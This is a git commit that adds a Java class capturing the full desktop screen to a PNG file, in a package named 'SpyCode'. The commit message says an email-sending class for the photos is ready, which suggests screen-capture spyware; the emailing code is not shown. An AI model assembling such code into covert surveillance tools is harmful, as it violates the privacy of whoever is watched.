9d225c8f1a9a5e799b325f3d718a1af76b6d4c2a
KonstantinBoyar <opezdalya@gmail.com>
2022-11-28 18:48:38 +0000

    GMailer class that should be sending messages with photo on your email is ready

---
+++ src/main/java/SpyCode/ScreenshotRec/PrntScreen.java
@@ -0,0 +1,31 @@
+package SpyCode.ScreenshotRec;
+
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.io.File;
+import java.io.IOException;
+import java.util.Random;
+
+public class PrntScreen {
+    /*
+    *
+    * Method should do screenshot of desktop
+    */
+
+    public void photo() throws IOException, AWTException {
+        String path = new File("").getAbsolutePath();
+        String format = ".png";
+
+        // Generating random number so that the names do not repeat
+        Random ran = new Random();
+        int number = ran.nextInt(100000000);
+        String nameOfScreenshot = Integer.toString(number);
+
+        String fullName = path + nameOfScreenshot + format;
+        System.out.println(fullName);
+
+        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+        ImageIO.write(image, "png", new File(fullName));
+    }
+}
